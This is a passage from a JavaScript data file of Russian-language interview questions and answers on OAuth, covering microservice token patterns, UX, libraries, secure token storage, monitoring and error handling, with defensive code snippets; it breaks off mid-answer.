Kong/Nginx:</strong></p><ul><li>// Kong OAuth2 plugin</li><li>plugins:</li><li>- name: oauth2</li><li>config:</li><li>scopes: [\"read\", \"write\"]</li><li>enable_authorization_code: true</li><li>// Добавляет headers</li><li>X-Consumer-ID: user-123</li><li>X-Consumer-Username: john</li></ul><p><strong>Паттерн 2 — Distributed Token Validation:</strong></p><p><strong>Архитектура:</strong></p><ul><li>Gateway пробрасывает токен как есть</li><li>Каждый микросервис сам проверяет токен</li><li>Независимая валидация</li></ul><p><strong>С JWT токенами:</strong></p><ul><li>Auth Service выдаёт JWT</li><li>Публикует публичный ключ через JWKS endpoint</li><li>Микросервисы загружают публичный ключ</li><li>Каждый сервис верифицирует JWT самостоятельно</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Нет единой точки отказа при валидации</li><li>✅ Каждый сервис контролирует проверку</li><li>✅ Offline валидация с JWT</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Дублирование логики валидации</li><li>❌ Сложнее отозвать токен</li></ul><p><strong>Паттерн 3 — Token Introspection:</strong></p><p><strong>Для opaque tokens (не JWT):</strong></p><ul><li>Микросервис не может прочитать токен</li><li>Делает запрос к Auth Service</li><li>POST /oauth/introspect</li><li>Получает информацию о токене</li></ul><p><strong>Response introspection:</strong></p><ul><li>{ \"active\": true, \"scope\": \"read write\", \"client_id\": \"app123\", \"username\": \"john\", \"exp\": 1419356238 }</li></ul><p><strong>Кэширование результатов:</strong></p><ul><li>Introspection результаты кэшируются (Redis)</li><li>TTL = min(exp - now, cache_ttl)</li><li>Баланс между производительностью и актуальностью</li></ul><p><strong>Паттерн 4 — Service-to-Service Authentication:</strong></p><p><strong>Проблема:</strong></p><ul><li>Сервис A вызывает Сервис B</li><li>Нужна аутентификация самого сервиса</li></ul><p><strong>Client Credentials Flow:</strong></p><ul><li>// Сервис получает собственный токен</li><li>POST /oauth/token</li><li>grant_type=client_credentials</li><li>&client_id=service-a</li><li>&client_secret=...</li><li>&scope=service:b:read</li></ul><p><strong>Использование:</strong></p><ul><li>// Сервис A → Сервис B</li><li>fetch('http://service-b/api/data', {</li><li>headers: { 'Authorization': `Bearer ${serviceToken}` }</li><li>});</li></ul><p><strong>Паттерн 5 — Token Exchange (OAuth 2.0 Token Exchange):</strong></p><p><strong>Сценарий:</strong></p><ul><li>У Сервиса A есть user token</li><li>Нужно вызвать Сервис B от имени пользователя</li><li>Но с ограниченными правами</li></ul><p><strong>Flow:</strong></p><ol><li>Service A → Auth Service: обмен user token</li><li>Запрос токена специфичного для Service B</li><li>← новый токен с узкими scopes</li><li>Service A → Service B: новый токен</li></ol><p><strong>Преимущества:</strong></p><ul><li>✅ Least privilege principle</li><li>✅ Токен специфичен для конкретного взаимодействия</li></ul><p><strong>Управление scopes в микросервисах:</strong></p><p><strong>Иерархия scopes:</strong></p><ul><li>service:orders:read — чтение заказов</li><li>service:orders:write — создание заказов</li><li>service:inventory:admin — полный доступ к инвентарю</li></ul><p><strong>Проверка в сервисе:</strong></p><ul><li>// Middleware для проверки scopes</li><li>requireScopes(['service:orders:write'])</li><li>app.post('/orders', requireScopes(['service:orders:write']), handler);</li></ul><p><strong>API Gateway patterns:</strong></p><p><strong>Rate Limiting по client_id:</strong></p><ul><li>Токен содержит client_id</li><li>Gateway ограничивает по клиенту</li><li>Защита от abuse</li></ul><p><strong>Dynamic Routing по scopes:</strong></p><ul><li>Разные scopes → разные backend версии</li><li>A/B тестирование</li><li>Канареечные релизы</li></ul><p><strong>Request Enrichment:</strong></p><ul><li>Gateway декодирует JWT</li><li>Добавляет данные в headers</li><li>X-User-Id, X-Tenant-Id, X-Roles</li></ul><p><strong>Отзыв токенов в распределённой системе:</strong></p><p><strong>Проблема:</strong></p><ul><li>JWT stateless — сложно отозвать</li><li>Нужен механизм для всех сервисов</li></ul><p><strong>Решение — Distributed Blacklist:</strong></p><ul><li>Redis с jti (token ID)</li><li>Каждый сервис проверяет перед использованием</li><li>TTL = время до exp</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ JWT для stateless валидации</li><li>✅ JWKS endpoint для раздачи ключей</li><li>✅ Короткий exp (5-15 мин)</li><li>✅ Service-to-service через Client Credentials</li><li>✅ Scopes для fine-grained авторизации</li><li>✅ Token introspection с кэшированием</li><li>✅ mTLS для внутреннего общения</li><li>✅ Distributed tracing для отладки</li></ul>",
    difficulty: 'senior',
    tags: ['OAuth', 'микросервисы', 'API Gateway', 'архитектура', 'токены']
  },

  {
    id: 80,
    question: "Как использование OAuth влияет на пользовательский опыт?",
    answer: "<p><strong>OAuth существенно влияет на UX</strong> как позитивно, так и создавая трения.</p><p><strong>Позитивное влияние на UX:</strong></p><p><strong>1. Упрощённая регистрация и вход:</strong></p><ul><li>\"Войти через Google/Facebook\" — один клик</li><li>Не нужно придумывать новый пароль</li><li>Не нужно заполнять форму регистрации</li><li>Меньше когнитивной нагрузки</li></ul><p><strong>Статистика:</strong></p><ul><li>Conversion rate выше на 30-50% с social login</li><li>Пользователи предпочитают знакомые кнопки</li></ul><p><strong>2. Меньше паролей для запоминания:</strong></p><ul><li>Один аккаунт Google → доступ ко многим сервисам</li><li>Не нужно помнить десятки паролей</li><li>Меньше \"забыл пароль\" сценариев</li></ul><p><strong>3. Безопасность без усилий:</strong></p><ul><li>2FA от провайдера (Google, GitHub)</li><li>Пользователь получает защиту автоматически</li><li>Не нужно настраивать везде отдельно</li></ul><p><strong>4. Быстрый доступ к данным:</strong></p><ul><li>Автозаполнение профиля</li><li>email, имя, фото сразу доступны</li><li>Меньше форм для заполнения</li></ul><p><strong>Негативное влияние на UX:</strong></p><p><strong>1. Consent Screen трение:</strong></p><p><strong>Проблема:</strong></p><ul><li>Пользователь видит страшный список разрешений</li><li>\"Приложение хочет доступ к вашим контактам, календарю, email...\"</li><li>Может испугаться и отказаться</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Запрашивайте минимум scopes сначала</li><li>✅ Incremental authorization — по мере необходимости</li><li>✅ Объясняйте зачем нужен каждый scope</li></ul><p><strong>2. Редиректы и потеря контекста:</strong></p><ul><li>Пользователь на вашем сайте</li><li>Redirect на Google</li><li>Redirect обратно</li><li>Может потерять что делал</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Сохранять state — куда вернуться</li><li>✅ Popup окно вместо full redirect (где возможно)</li><li>✅ Информировать \"Сейчас откроется окно авторизации\"</li></ul><p><strong>3. Проблемы с несколькими аккаунтами:</strong></p><ul><li>Пользователь залогинен в Google как work@company.com</li><li>Хочет использовать personal@gmail.com</li><li>Провайдер автоматически использует текущую сессию</li><li>Путаница какой аккаунт используется</li></ul><p><strong>Решение:</strong></p><ul><li>✅ prompt=select_account в OAuth параметрах</li><li>✅ Показывать какой аккаунт подключён</li><li>✅ Возможность переподключить другой аккаунт</li></ul><p><strong>4. Vendor Lock-in ощущение:</strong></p><ul><li>\"Войти можно только через Google\"</li><li>Что если у пользователя нет Google аккаунта?</li><li>Ощущение зависимости</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Множественные провайдеры (Google, GitHub, Facebook)</li><li>✅ Опция email/password регистрации</li><li>✅ Возможность привязать несколько методов входа</li></ul><p><strong>5. Сложность отзыва доступа:</strong></p><ul><li>Пользователь не знает где отозвать разрешение</li><li>Не в вашем приложении, а на accounts.google.com</li><li>Неочевидный UX</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Показывать в настройках приложения</li><li>✅ Прямая ссылка на управление разрешениями</li><li>✅ Информировать как отключить доступ</li></ul><p><strong>Best Practices для хорошего UX:</strong></p><p><strong>1. Прозрачность и контроль:</strong></p><ul><li>Объясняйте что произойдёт при клике \"Войти через...\"</li><li>Показывайте какие данные получите</li><li>Давайте контроль над разрешениями</li></ul><p><strong>2. Прогрессивное раскрытие:</strong></p><ul><li>Сначала базовые scopes (email, profile)</li><li>Потом, когда нужна функция — дополнительные</li><li>\"Чтобы добавить событие, разрешите доступ к календарю\"</li></ul><p><strong>3. Fallback опции:</strong></p><ul><li>Не только OAuth провайдеры</li><li>Email/password как альтернатива</li><li>Magic link для тех кто не хочет OAuth</li></ul><p><strong>4. Визуальная обратная связь:</strong></p><ul><li>Индикатор загрузки при редиректах</li><li>\"Перенаправляем на Google...\"</li><li>Подтверждение успешного входа</li></ul><p><strong>5. Управление подключениями:</strong></p><ul><li>Страница \"Подключённые аккаунты\"</li><li>Показать что подключено и когда</li><li>Кнопка \"Отключить\"</li><li>Возможность переподключить</li></ul><p><strong>6. Обработка ошибок gracefully:</strong></p><ul><li>Пользователь отклонил разрешение → не пугать</li><li>\"Без доступа к календарю эта функция недоступна\"</li><li>Предложить alternative flow</li></ul><p><strong>Метрики для отслеживания UX:</strong></p><ul><li>📊 Conversion rate OAuth vs email/password</li><li>📊 Drop-off на consent screen</li><li>📊 Время до первого входа</li><li>📊 Bounce rate после редиректа</li><li>📊 Частота смены провайдера</li></ul><p><strong>A/B тестирование элементов:</strong></p><ul><li>Порядок кнопок провайдеров</li><li>Текст на кнопках (\"Войти через Google\" vs \"Продолжить с Google\")</li><li>Размещение OAuth кнопок (вверху vs внизу формы)</li><li>Popup vs full redirect</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'UX', 'пользовательский опыт', 'consent', 'best practices']
  },

  {
    id: 81,
    question: "Какие популярные библиотеки и инструменты существуют для работы с OAuth?",
    answer: "<p><strong>Экосистема OAuth инструментов</strong> богата решениями для разных платформ и задач.</p><p><strong>JavaScript/Node.js библиотеки:</strong></p><p><strong>1. Passport.js:</strong></p><ul><li>Самая популярная authentication библиотека для Node.js</li><li>Стратегии для всех крупных провайдеров</li><li>passport-google-oauth20, passport-github2, passport-facebook</li></ul><p><strong>Пример:</strong></p><ul><li>passport.use(new GoogleStrategy({</li><li>clientID: GOOGLE_CLIENT_ID,</li><li>clientSecret: GOOGLE_CLIENT_SECRET,</li><li>callbackURL: '/auth/google/callback'</li><li>}, (accessToken, refreshToken, profile, done) => {</li><li>// Сохранить пользователя</li><li>});</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Очень гибкая</li><li>✅ Огромное сообщество</li><li>⚠️ Требует понимания как работает</li><li>⚠️ Много boilerplate кода</li></ul><p><strong>2. NextAuth.js (для Next.js):</strong></p><ul><li>Специально для Next.js приложений</li><li>Встроенная поддержка OAuth провайдеров</li><li>JWT и database sessions</li><li>Serverless friendly</li></ul><p><strong>Пример:</strong></p><ul><li>providers: [</li><li>GoogleProvider({</li><li>clientId: process.env.GOOGLE_ID,</li><li>clientSecret: process.env.GOOGLE_SECRET</li><li>}),</li><li>GitHubProvider({ ... })</li><li>]</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Из коробки для Next.js</li><li>✅ Минимум настройки</li><li>✅ Отличная документация</li><li>⚠️ Привязан к Next.js</li></ul><p><strong>3. OAuth2orize (для создания OAuth сервера):</strong></p><ul><li>Toolkit для построения собственного OAuth2 сервера</li><li>Полный контроль над flow</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Гибкость</li><li>❌ Сложная настройка</li><li>❌ Много кода писать самому</li></ul><p><strong>4. simple-oauth2:</strong></p><ul><li>Лёгкая обёртка для OAuth2 flows</li><li>Универсальный клиент для любого провайдера</li></ul><p><strong>Frontend библиотеки:</strong></p><p><strong>1. oidc-client-ts (TypeScript):</strong></p><ul><li>OpenID Connect клиент для браузера</li><li>PKCE поддержка</li><li>Silent refresh</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Надёжная</li><li>✅ TypeScript support</li><li>⚠️ Требует понимания OIDC</li></ul><p><strong>2. @auth0/auth0-spa-js:</strong></p><ul><li>От Auth0, но работает с любым OIDC провайдером</li><li>Удобный API для SPA</li></ul><p><strong>React библиотеки:</strong></p><ul><li>@react-oauth/google — Google OAuth для React</li><li>react-oauth-flow — универсальный wrapper</li></ul><p><strong>OAuth провайдеры (Identity as a Service):</strong></p><p><strong>1. Auth0:</strong></p><p><strong>Что предоставляет:</strong></p><ul><li>Готовый OAuth/OIDC сервер</li><li>Social connections из коробки</li><li>Customizable login pages</li><li>MFA, passwordless</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Быстрая интеграция (часы, не недели)</li><li>✅ Enterprise features</li><li>✅ Отличная документация</li><li>❌ Дорогой при масштабе</li><li>⚠️ Vendor lock-in</li></ul><p><strong>2. Keycloak (open-source):</strong></p><p><strong>Что предоставляет:</strong></p><ul><li>Self-hosted Identity Provider</li><li>OAuth 2.0, OIDC, SAML</li><li>User federation</li><li>Admin console</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Бесплатный и мощный</li><li>✅ Полный контроль</li><li>❌ Сложная настройка</li><li>❌ Нужно самому хостить и поддерживать</li></ul><p><strong>3. Supabase Auth:</strong></p><ul><li>Часть Supabase ecosystem</li><li>OAuth + email/password</li><li>Row Level Security интеграция</li></ul><p><strong>Опыт:</strong></p><ul><li>✅ Простая интеграция</li><li>✅ Бесплатный tier</li><li>⚠️ Завязан на Supabase экосистему</li></ul><p><strong>4. Firebase Auth:</strong></p><ul><li>От Google</li><li>OAuth providers + phone auth</li><li>Интеграция с Firebase services</li></ul><p><strong>5. AWS Cognito:</strong></p><ul><li>Управляемый сервис от AWS</li><li>OAuth, OIDC, SAML</li><li>User pools и identity pools</li></ul><p><strong>Инструменты для тестирования:</strong></p><p><strong>1. OAuth Playground:</strong></p><ul><li>Google OAuth 2.0 Playground</li><li>Интерактивное тестирование flows</li><li>Помогает понять как работает</li></ul><p><strong>2. Postman:</strong></p><ul><li>OAuth 2.0 поддержка встроена</li><li>Автоматический token refresh</li><li>Тестирование API с OAuth</li></ul><p><strong>3. jwt.io:</strong></p><ul><li>Декодирование и валидация JWT</li><li>Проверка подписи</li><li>Отладка ID tokens</li></ul><p><strong>Стеки по типам приложений:</strong></p><p><strong>SPA (React/Vue):</strong></p><ul><li>Frontend: oidc-client-ts или NextAuth (для Next.js)</li><li>Backend: Express + Passport или готовый провайдер</li></ul><p><strong>Серверный SSR:</strong></p><ul><li>NextAuth.js (Next.js)</li><li>Passport.js (Express)</li><li>Laravel Socialite (PHP)</li></ul><p><strong>Мобильные приложения:</strong></p><ul><li>React Native: react-native-app-auth</li><li>Flutter: flutter_appauth</li><li>Native: AppAuth-iOS, AppAuth-Android</li></ul><p><strong>Микросервисы:</strong></p><ul><li>Keycloak как central auth</li><li>Kong/Nginx с OAuth plugins</li><li>Istio для service mesh auth</li></ul><p><strong>Личный опыт и рекомендации:</strong></p><ul><li>✅ Для MVP — Auth0/Supabase (быстрый старт)</li><li>✅ Для контроля — Keycloak (но готовьтесь потратить время)</li><li>✅ Для Next.js — NextAuth (идеальная интеграция)</li><li>✅ Для понимания — сначала реализовать с Passport вручную</li><li>⚠️ Не писать OAuth сервер с нуля без веской причины</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'библиотеки', 'инструменты', 'Passport.js', 'Auth0', 'Keycloak']
  },

  {
    id: 82,
    question: "Как правильно хранить OAuth токены и credentials?",
    answer: "<p><strong>Безопасное хранение OAuth токенов</strong> критично для защиты пользовательских данных.</p><p><strong>Client Secret (серверная сторона):</strong></p><p><strong>Что это:</strong></p><ul><li>Секретный ключ вашего приложения</li><li>Используется для обмена authorization code на tokens</li><li>НЕ должен быть доступен клиенту</li></ul><p><strong>Где хранить:</strong></p><ul><li>✅ <strong>Environment variables</strong> — основной способ</li><li>✅ <strong>Secrets manager</strong> — AWS Secrets Manager, HashiCorp Vault</li><li>✅ <strong>Encrypted config files</strong> — с доступом только для сервера</li></ul><p><strong>Где НЕ хранить:</strong></p><ul><li>❌ В коде (hardcoded)</li><li>❌ В git repository</li><li>❌ В frontend коде</li><li>❌ В database без шифрования</li><li>❌ В логах</li></ul><p><strong>Пример (Node.js):</strong></p><ul><li>// .env файл (не коммитить!)</li><li>GOOGLE_CLIENT_ID=123.apps.googleusercontent.com</li><li>GOOGLE_CLIENT_SECRET=secret_abc123</li><li>// Использование</li><li>const clientSecret = process.env.GOOGLE_CLIENT_SECRET;</li></ul><p><strong>Access Token:</strong></p><p><strong>Backend (серверные приложения):</strong></p><ul><li>✅ <strong>In-memory</strong> — лучший вариант для short-lived операций</li><li>✅ <strong>Encrypted session storage</strong> — Redis, Memcached</li><li>✅ <strong>Database encrypted</strong> — если нужна persistence</li></ul><p><strong>Пример с Redis:</strong></p><ul><li>// Сохранение</li><li>await redis.setex(`token:${userId}`, 3600, accessToken);</li><li>// Получение</li><li>const token = await redis.get(`token:${userId}`);</li></ul><p><strong>Frontend (SPA):</strong></p><table><tr><th>Способ</th><th>XSS риск</th><th>Lifetime</th><th>Рекомендация</th></tr><tr><td>Memory (переменная)</td><td>⚠️ Средний</td><td>До reload</td><td>✅ Лучший</td></tr><tr><td>sessionStorage</td><td>❌ Высокий</td><td>До закрытия tab</td><td>⚠️ Приемлемо</td></tr><tr><td>localStorage</td><td>❌ Очень высокий</td><td>Постоянно</td><td>❌ Избегать</td></tr><tr><td>HttpOnly Cookie (через BFF)</td><td>✅ Защищён</td><td>Настраиваемо</td><td>✅ Идеально</td></tr></table><p><strong>Рекомендуемый паттерн для SPA:</strong></p><ul><li>// Хранение в памяти</li><li>let accessToken = null;</li><li>let tokenExpiry = null;</li><li>// Установка после получения</li><li>function setToken(token, expiresIn) {</li><li>accessToken = token;</li><li>tokenExpiry = Date.now() + (expiresIn * 1000);</li><li>}</li><li>// Проверка перед использованием</li><li>function getValidToken() {</li><li>if (Date.now() >= tokenExpiry) {</li><li>// Refresh token или re-login</li><li>}</li><li>return accessToken;</li><li>}</li></ul><p><strong>Refresh Token:</strong></p><p><strong>Особенности:</strong></p><ul><li>Более чувствителен чем access token</li><li>Долгоживущий (дни/недели)</li><li>Требует особой защиты</li></ul><p><strong>Backend:</strong></p><ul><li>✅ <strong>Database encrypted</strong> — основной способ</li><li>✅ <strong>Hash перед хранением</strong> — как пароли</li><li>✅ <strong>Metadata</strong> — user agent, IP для обнаружения кражи</li></ul><p><strong>Пример хранения:</strong></p><ul><li>// Таблица refresh_tokens</li><li>{ id, token_hash: bcrypt.hash(token), user_id, expires_at, created_at, ip_address, user_agent, is_revoked }</li></ul><p><strong>Frontend (SPA):</strong></p><ul><li>✅ <strong>HttpOnly cookie</strong> — лучший вариант</li><li>✅ Или отправлять на backend для хранения</li><li>❌ Никогда в localStorage/sessionStorage</li></ul><p><strong>Пример с HttpOnly cookie:</strong></p><ul><li>// Server устанавливает cookie</li><li>res.cookie('refresh_token', token, {</li><li>httpOnly: true,</li><li>secure: true,</li><li>sameSite: 'strict',</li><li>maxAge: 7 * 24 * 60 * 60 * 1000 // 7 дней</li><li>});</li></ul><p><strong>Best Practices для хранения:</strong></p><p><strong>1. Шифрование в transit и at rest:</strong></p><ul><li>✅ HTTPS для передачи</li><li>✅ Encrypt в database</li><li>✅ TLS для внутренних коммуникаций</li></ul><p><strong>2. Минимизация хранения:</strong></p><ul><li>✅ Хранить только когда необходимо</li><li>✅ Короткий TTL для access tokens</li><li>✅ Удалять истёкшие токены</li></ul><p><strong>3. Защита от утечки:</strong></p><ul><li>✅ Не логировать токены</li><li>✅ Фильтровать в error reports</li><li>✅ Маскировать в админке</li></ul><p><strong>4. Ротация и отзыв:</strong></p><ul><li>✅ Refresh token rotation</li><li>✅ Механизм отзыва</li><li>✅ Отзыв при смене пароля</li></ul><p><strong>Типичные ошибки:</strong></p><ul><li>❌ Access token в localStorage для \"удобства\"</li><li>❌ Client Secret в frontend коде</li><li>❌ Токены в URL параметрах</li><li>❌ Хранение в plain text в БД</li><li>❌ Отсутствие expiration для токенов</li><li>❌ Невозможность отозвать токен</li></ul><p><strong>Checklist безопасности:</strong></p><ul><li>✅ Client Secret только на сервере</li><li>✅ Environment variables для secrets</li><li>✅ Access token в памяти или HttpOnly cookie</li><li>✅ Refresh token в HttpOnly cookie или encrypted DB</li><li>✅ HTTPS everywhere</li><li>✅ Короткий TTL для access tokens</li><li>✅ Механизм ротации refresh tokens</li><li>✅ Возможность отзыва токенов</li><li>✅ Логирование без токенов</li><li>✅ CSP для защиты от XSS</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'хранение токенов', 'безопасность', 'credentials', 'best practices']
  },
  {
    id: 83,
    question: "Какие метрики и мониторинг важны для OAuth интеграций?",
    answer: "<p><strong>Мониторинг OAuth</strong> помогает обнаружить проблемы безопасности и улучшить UX.</p><p><strong>Метрики авторизации:</strong></p><p><strong>1. Success/Failure Rate:</strong></p><ul><li><strong>Authorization Success Rate</strong> — % успешных авторизаций</li><li><strong>Token Exchange Success Rate</strong> — успешность обмена code на token</li><li><strong>Refresh Success Rate</strong> — успешность обновления токенов</li></ul><p><strong>Что отслеживать:</strong></p><ul><li>Внезапное падение success rate → проблема с провайдером или конфигурацией</li><li>Высокий failure rate для конкретного провайдера → issue с интеграцией</li></ul><p><strong>2. Latency метрики:</strong></p><ul><li><strong>Authorization Flow Duration</strong> — время от начала до получения токена</li><li><strong>Token Exchange Time</strong> — скорость /token endpoint</li><li><strong>Token Validation Time</strong> — время проверки токена</li></ul><p><strong>Alert пороги:</strong></p><ul><li>⚠️ Latency > 3 секунды → плохой UX</li><li>🔴 Latency > 10 секунд → серьёзная проблема</li></ul><p><strong>3. Provider-specific метрики:</strong></p><ul><li>Success rate по провайдерам (Google vs GitHub vs Facebook)</li><li>Популярность провайдеров среди пользователей</li><li>Downtime конкретных провайдеров</li></ul><p><strong>Метрики безопасности:</strong></p><p><strong>1. Подозрительная активность:</strong></p><ul><li><strong>Failed Login Attempts</strong> — частые неудачи для одного user/IP</li><li><strong>Token Reuse Detection</strong> — попытки использовать отозванные токены</li><li><strong>Unusual Geographic Patterns</strong> — логин из разных стран</li><li><strong>Rate Limit Violations</strong> — превышение лимитов запросов</li></ul><p><strong>Alerts:</strong></p><ul><li>🔴 10+ failed attempts за минуту от одного IP</li><li>🔴 Использование токена после отзыва</li><li>⚠️ Логин из новой страны без 2FA</li></ul><p><strong>2. Token lifecycle метрики:</strong></p><ul><li><strong>Active Tokens Count</strong> — количество активных токенов</li><li><strong>Token Expiration Rate</strong> — сколько истекает vs обновляется</li><li><strong>Refresh Token Rotation Rate</strong> — частота ротации</li><li><strong>Average Token Lifetime</strong> — среднее время жизни</li></ul><p><strong>3. CSRF/State validation:</strong></p><ul><li>State mismatch rate — сколько запросов с неправильным state</li><li>Missing state parameter — запросы без state</li></ul><p><strong>User Experience метрики:</strong></p><p><strong>1. Conversion метрики:</strong></p><ul><li><strong>OAuth Conversion Rate</strong> — % завершивших авторизацию</li><li><strong>Consent Screen Drop-off</strong> — отказы на экране разрешений</li><li><strong>Provider Selection Distribution</strong> — какие провайдеры выбирают</li></ul><p><strong>2. User journey метрики:</strong></p><ul><li>Time to first successful login</li><li>Bounce rate после редиректа</li><li>Повторные попытки авторизации</li></ul><p><strong>Инструменты мониторинга:</strong></p><p><strong>1. Application Performance Monitoring:</strong></p><ul><li><strong>DataDog</strong> — custom metrics, dashboards, alerts</li><li><strong>New Relic</strong> — transaction tracing, error tracking</li><li><strong>Grafana</strong> — визуализация метрик</li></ul><p><strong>2. Log aggregation:</strong></p><ul><li><strong>ELK Stack</strong> — Elasticsearch, Logstash, Kibana</li><li><strong>Splunk</strong> — анализ логов</li><li><strong>CloudWatch Logs</strong> — для AWS инфраструктуры</li></ul><p><strong>3. Security monitoring:</strong></p><ul><li><strong>Sentry</strong> — error tracking с контекстом</li><li><strong>Auth0 Anomaly Detection</strong> — встроенный в Auth0</li><li><strong>Custom SIEM</strong> — для enterprise</li></ul><p><strong>Что логировать:</strong></p><p><strong>Критичные события:</strong></p><ul><li>✅ Successful authorization</li><li>✅ Failed authorization attempts</li><li>✅ Token issued/refreshed/revoked</li><li>✅ Scope changes</li><li>✅ Account linking/unlinking</li></ul><p><strong>Контекст для логов:</strong></p><ul><li>Timestamp</li><li>User ID (если известен)</li><li>Client ID</li><li>Provider name</li><li>IP address</li><li>User agent</li><li>Requested scopes</li><li>Error codes/messages</li></ul><p><strong>Что НЕ логировать:</strong></p><ul><li>❌ Полные токены (только последние 4 символа)</li><li>❌ Client Secret</li><li>❌ Пользовательские пароли</li><li>❌ Authorization codes (или маскировать)</li></ul><p><strong>Dashboard примеры:</strong></p><p><strong>Real-time Dashboard:</strong></p><ul><li>📊 Authorization requests/min</li><li>📊 Success rate (последний час)</li><li>📊 Active sessions count</li><li>📊 Top errors</li></ul><p><strong>Security Dashboard:</strong></p><ul><li>🔒 Failed login attempts map (geographic)</li><li>🔒 Suspicious IP addresses</li><li>🔒 Token revocations</li><li>🔒 Rate limit violations</li></ul><p><strong>Business Dashboard:</strong></p><ul><li>📈 OAuth adoption rate</li><li>📈 Provider preference trends</li><li>📈 Conversion funnel</li><li>📈 User retention через OAuth</li></ul><p><strong>Alerts настройка:</strong></p><p><strong>Critical (Pager):</strong></p><ul><li>🚨 Authorization endpoint down</li><li>🚨 Success rate < 50%</li><li>🚨 Массовые token revocations</li></ul><p><strong>Warning (Email/Slack):</strong></p><ul><li>⚠️ Success rate < 90%</li><li>⚠️ Latency > 5s</li><li>⚠️ Unusual activity spike</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Real-time мониторинг критичных метрик</li><li>✅ Retention логов минимум 90 дней</li><li>✅ Корреляция OAuth событий с бизнес-метриками</li><li>✅ Автоматические alerts на аномалии</li><li>✅ Регулярный review security логов</li><li>✅ A/B тестирование OAuth flows с метриками</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'мониторинг', 'метрики', 'безопасность', 'observability']
  },

  {
    id: 84,
    question: "Как обрабатывать ошибки в OAuth flow и какие типичные проблемы возникают?",
    answer: "<p><strong>Обработка ошибок в OAuth</strong> критична для UX и безопасности.</p><p><strong>Типы ошибок OAuth:</strong></p><p><strong>1. Authorization errors (на /authorize endpoint):</strong></p><p><strong>access_denied:</strong></p><ul><li>Пользователь отказал в разрешении</li><li>Нажал \"Отмена\" на consent screen</li><li>Самая частая ошибка</li></ul><p><strong>Обработка:</strong></p><ul><li>// Redirect содержит error=access_denied</li><li>if (params.get('error') === 'access_denied') {</li><li>  // Показать дружелюбное сообщение</li><li>  'Для использования этой функции нужен доступ к календарю'</li><li>  // Предложить alternative или попробовать снова</li><li>}</li></ul><p><strong>invalid_request:</strong></p><ul><li>Неправильные параметры запроса</li><li>Отсутствует required параметр</li><li>Неправильный формат</li></ul><p><strong>Обработка:</strong></p><ul><li>✅ Валидация параметров перед отправкой</li><li>✅ Логирование для debugging</li><li>⚠️ Обычно это баг в коде</li></ul><p><strong>unauthorized_client:</strong></p><ul><li>Client ID не зарегистрирован</li><li>Неправильная конфигурация</li></ul><p><strong>server_error / temporarily_unavailable:</strong></p><ul><li>Проблемы на стороне провайдера</li><li>Временные технические неполадки</li></ul><p><strong>Обработка:</strong></p><ul><li>✅ Retry с exponential backoff</li><li>✅ Fallback на другой провайдер</li><li>✅ Информировать пользователя о временных проблемах</li></ul><p><strong>2. Token endpoint errors (на /token):</strong></p><p><strong>invalid_grant:</strong></p><ul><li>Authorization code уже использован</li><li>Code истёк (обычно 10 минут)</li><li>Code был выдан другому client</li><li>Неправильный redirect_uri</li></ul><p><strong>Причины:</strong></p><ul><li>Пользователь дважды кликнул callback URL</li><li>Медленное соединение → таймаут code</li><li>PKCE code_verifier не совпадает</li></ul><p><strong>Обработка:</strong></p><ul><li>// Перезапустить OAuth flow</li><li>if (error === 'invalid_grant') {</li><li>  redirectToAuthorization();</li><li>}</li></ul><p><strong>invalid_client:</strong></p><ul><li>Неправильный Client ID или Secret</li><li>Client не активен</li></ul><p><strong>Обработка:</strong></p><ul><li>🔴 Critical error — проверить конфигурацию</li><li>✅ Alert для разработчиков</li></ul><p><strong>3. API errors (при использовании токена):</strong></p><p><strong>401 Unauthorized:</strong></p><ul><li>Token истёк</li><li>Token отозван</li><li>Невалидная подпись</li></ul><p><strong>Обработка:</strong></p><ul><li>// HTTP interceptor</li><li>if (response.status === 401) {</li><li>  const newToken = await refreshAccessToken();</li><li>  // Retry с новым токеном</li><li>  return retryRequest(config, newToken);</li><li>}</li></ul><p><strong>403 Forbidden:</strong></p><ul><li>Нет нужных scopes</li><li>Resource недоступен для этого пользователя</li></ul><p><strong>Обработка:</strong></p><ul><li>if (response.status === 403) {</li><li>  // Проверить scopes в токене</li><li>  // Запросить дополнительные permissions</li><li>  requestAdditionalScopes(['calendar.write']);</li><li>}</li></ul><p><strong>Типичные проблемы и решения:</strong></p><p><strong>1. CSRF атака через state:</strong></p><p><strong>Проблема:</strong></p><ul><li>state parameter отсутствует или не проверяется</li><li>Злонамеренник может подделать callback</li></ul><p><strong>Решение:</strong></p><ul><li>// Генерация state</li><li>const state = crypto.randomBytes(32).toString('hex');</li><li>sessionStorage.setItem('oauth_state', state);</li><li>// Проверка при callback</li><li>const receivedState = params.get('state');</li><li>const savedState = sessionStorage.getItem('oauth_state');</li><li>if (receivedState !== savedState) {</li><li>  throw new Error('CSRF detected');</li><li>}</li></ul><p><strong>2. Redirect URI mismatch:</strong></p><p><strong>Проблема:</strong></p><ul><li>Callback URL не совпадает с зарегистрированным</li><li>Протокол (http vs https)</li><li>Trailing slash</li><li>Query parameters</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Точное совпадение при регистрации</li><li>✅ Использовать константу для redirect_uri</li><li>✅ HTTPS в production</li></ul><p><strong>3. Token не обновляется:</strong></p><p><strong>Проблема:</strong></p><ul><li>Refresh token истёк</li><li>Refresh token использован дважды (rotation)</li><li>User отозвал доступ</li></ul><p><strong>Решение:</strong></p><ul><li>async function ensureValidToken() {</li><li>  if (isExpired(accessToken)) {</li><li>    try {</li><li>      accessToken = await refresh(refreshToken);</li><li>    } catch (error) {</li><li>      // Refresh failed → требуется 